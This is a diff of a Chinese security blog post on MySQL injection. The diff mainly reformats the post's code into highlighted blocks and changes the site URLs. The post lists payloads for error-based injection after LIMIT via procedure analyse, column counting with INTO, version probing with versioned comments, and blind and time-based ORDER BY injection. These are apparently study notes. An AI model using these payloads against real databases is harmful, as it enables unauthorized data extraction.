@@ -71,12 +71,12 @@
 
 
 
-<meta name="description" content="mysql limit注入证明注入方法目前limit后注入的唯一方法是使用procedure analyse进行报错注入limit=1 procedure analyse(1,extractvalue(rand(),concat(0x3a,version()))); 注入版本使用analyse()只能5.0.0&amp;lt;mysql&amp;lt;5.6.6的版本 使用into，查字段数原字段数为3selec">
+<meta name="description" content="mysql limit注入证明注入方法目前limit后注入的唯一方法是使用procedure analyse进行报错注入 limit=1 procedure analyse(1,extractvalue(rand(),concat(0x3a,version())));   注入版本使用analyse()只能5.0.0&amp;lt;mysql&amp;lt;5.6.6的版本 使用into，查字段数原字段数为3 s">
 <meta property="og:type" content="article">
 <meta property="og:title" content="mysql limit注入">
-<meta property="og:url" content="http://www.cuittk.cn/2020/01/10/mysql limit注入/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2020/01/10/mysql limit注入/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
-<meta property="og:description" content="mysql limit注入证明注入方法目前limit后注入的唯一方法是使用procedure analyse进行报错注入limit=1 procedure analyse(1,extractvalue(rand(),concat(0x3a,version()))); 注入版本使用analyse()只能5.0.0&amp;lt;mysql&amp;lt;5.6.6的版本 使用into，查字段数原字段数为3selec">
+<meta property="og:description" content="mysql limit注入证明注入方法目前limit后注入的唯一方法是使用procedure analyse进行报错注入 limit=1 procedure analyse(1,extractvalue(rand(),concat(0x3a,version())));   注入版本使用analyse()只能5.0.0&amp;lt;mysql&amp;lt;5.6.6的版本 使用into，查字段数原字段数为3 s">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/bo52c9djgzr272sapgs6mybonu.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/7a52vhqsxcuzbolq94wkywyoje.png">
@@ -86,10 +86,10 @@
 <meta property="og:image" content="http://img.cdn.cuittk.cn/0cdsfvwudp4aeaqc5hq8tqog8p.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/o1xb2guloackguyij2tk0qwqj8.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/63mxlmq0zc0g4oa6frjmlhni2j.png">
-<meta property="og:updated_time" content="2020-02-09T06:23:34.255Z">
+<meta property="og:updated_time" content="2020-02-26T08:03:49.584Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql limit注入">
-<meta name="twitter:description" content="mysql limit注入证明注入方法目前limit后注入的唯一方法是使用procedure analyse进行报错注入limit=1 procedure analyse(1,extractvalue(rand(),concat(0x3a,version()))); 注入版本使用analyse()只能5.0.0&amp;lt;mysql&amp;lt;5.6.6的版本 使用into，查字段数原字段数为3selec">
+<meta name="twitter:description" content="mysql limit注入证明注入方法目前limit后注入的唯一方法是使用procedure analyse进行报错注入 limit=1 procedure analyse(1,extractvalue(rand(),concat(0x3a,version())));   注入版本使用analyse()只能5.0.0&amp;lt;mysql&amp;lt;5.6.6的版本 使用into，查字段数原字段数为3 s">
 <meta name="twitter:image" content="http://img.cdn.cuittk.cn/bo52c9djgzr272sapgs6mybonu.png">
 
 
@@ -120,12 +120,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2020/01/10/mysql limit注入/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2020/01/10/mysql limit注入/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>mysql limit注入 | h1tler's blog</title>
   
 
@@ -263,7 +263,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2020/01/10/mysql limit注入/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2020/01/10/mysql limit注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -357,16 +357,37 @@
       
 
       
-        <h2 id="mysql-limit注入证明"><a href="#mysql-limit注入证明" class="headerlink" title="mysql limit注入证明"></a>mysql limit注入证明</h2><h3 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h3><p>目前limit后注入的唯一方法是使用procedure analyse进行报错注入<br><code>limit=1 procedure analyse(1,extractvalue(rand(),concat(0x3a,version())));</code><br><img src="http://img.cdn.cuittk.cn/bo52c9djgzr272sapgs6mybonu.png" alt=""></p>
+        <h2 id="mysql-limit注入证明"><a href="#mysql-limit注入证明" class="headerlink" title="mysql limit注入证明"></a>mysql limit注入证明</h2><h3 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h3><p>目前limit后注入的唯一方法是使用procedure analyse进行报错注入</p>
+<pre><code class="language-html">limit=1 procedure analyse(1,extractvalue(rand(),concat(0x3a,version())));
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/bo52c9djgzr272sapgs6mybonu.png" alt=""></p>
 <h3 id="注入版本"><a href="#注入版本" class="headerlink" title="注入版本"></a>注入版本</h3><p>使用analyse()只能5.0.0&lt;mysql&lt;5.6.6的版本</p>
-<h3 id="使用into，查字段数"><a href="#使用into，查字段数" class="headerlink" title="使用into，查字段数"></a>使用into，查字段数</h3><p>原字段数为3<br><img src="http://img.cdn.cuittk.cn/7a52vhqsxcuzbolq94wkywyoje.png" alt=""><br><code>select * from users order by id limit 0,4 into @</code><br><img src="http://img.cdn.cuittk.cn/836igjxo71i0yzu784av8oada3.png" alt=""></p>
-<p><code>select * from users order by id limit 0,4 into @,@,@</code><br><img src="http://img.cdn.cuittk.cn/6eb0cytjyr8859vo75hztijbjf.png" alt=""><br>得到字段数为3</p>
+<h3 id="使用into，查字段数"><a href="#使用into，查字段数" class="headerlink" title="使用into，查字段数"></a>使用into，查字段数</h3><p>原字段数为3<br><img src="http://img.cdn.cuittk.cn/7a52vhqsxcuzbolq94wkywyoje.png" alt=""></p>
+<pre><code class="language-html">select * from users order by id limit 0,4 into @
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/836igjxo71i0yzu784av8oada3.png" alt=""></p>
+<pre><code class="language-html">select * from users order by id limit 0,4 into @,@,@
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/6eb0cytjyr8859vo75hztijbjf.png" alt=""><br>得到字段数为3</p>
 <h1 id="判断版本号"><a href="#判断版本号" class="headerlink" title="判断版本号"></a>判断版本号</h1><p>真实版本：5.5.53<br><img src="http://img.cdn.cuittk.cn/bo52c9djgzr272sapgs6mybonu.png" alt=""></p>
-<p><code>1/*!50551aaaa*/报错，说明版本号5.5.51并不大于真实版本</code><br><img src="http://img.cdn.cuittk.cn/0cdsfvwudp4aeaqc5hq8tqog8p.png" alt=""></p>
-<p><code>1/*!50553aaaa*/报错，说明版本号5.5.53并不大于真实版本</code><br><img src="http://img.cdn.cuittk.cn/o1xb2guloackguyij2tk0qwqj8.png" alt=""></p>
-<p><code>1/*!50554aaaa*/返回正常，说明版本号5.5.54&gt;真实版本</code><br><img src="http://img.cdn.cuittk.cn/63mxlmq0zc0g4oa6frjmlhni2j.png" alt=""><br>得到版本号：5.5.53</p>
-<h2 id="orderby-注入"><a href="#orderby-注入" class="headerlink" title="orderby 注入"></a>orderby 注入</h2><p>?order=if(1=1,name,price)<br>/?order=IF(1=1,name,price) 通过name字段排序<br>/?order=IF(1=2,name,price) 通过price字段排序<br>if(1=2,1,SLEEP(2))</p>
-<p>数据猜解<br>/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确<br>/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误</p>
+<pre><code class="language-html">1/*!50551aaaa*/报错，说明版本号5.5.51并不大于真实版本
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/0cdsfvwudp4aeaqc5hq8tqog8p.png" alt=""></p>
+<pre><code class="language-html">1/*!50553aaaa*/报错，说明版本号5.5.53并不大于真实版本
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/o1xb2guloackguyij2tk0qwqj8.png" alt=""></p>
+<pre><code class="language-html">1/*!50554aaaa*/返回正常，说明版本号5.5.54&gt;真实版本
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/63mxlmq0zc0g4oa6frjmlhni2j.png" alt=""><br>得到版本号：5.5.53</p>
+<h2 id="orderby-注入"><a href="#orderby-注入" class="headerlink" title="orderby 注入"></a>orderby 注入</h2><pre><code class="language-html">/?order=if(1=1,name,price)
+/?order=IF(1=1,name,price) 通过name字段排序
+/?order=IF(1=2,name,price) 通过price字段排序
+if(1=2,1,SLEEP(2))
+</code></pre>
+<p>数据猜解</p>
+<pre><code class="language-html">/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确
+/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误
+</code></pre>
 <p>猜解当前数据库的表名<br>猜解指定表名中的列名</p>
 <h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/piaomiaohongchen/p/10680088.html" target="_blank" rel="external">https://www.cnblogs.com/piaomiaohongchen/p/10680088.html</a><br><a href="http://www.vuln.cn/8101" target="_blank" rel="external">http://www.vuln.cn/8101</a><br><a href="http://www.2cto.com/Article/201206/134211.html" target="_blank" rel="external">http://www.2cto.com/Article/201206/134211.html</a><br>长亭科技 渗透测试实习面试<a href="https://m.kanzhun.com/gsmsh11423843.html" target="_blank" rel="external">https://m.kanzhun.com/gsmsh11423843.html</a></p>
 
@@ -487,7 +508,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -615,7 +636,7 @@
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
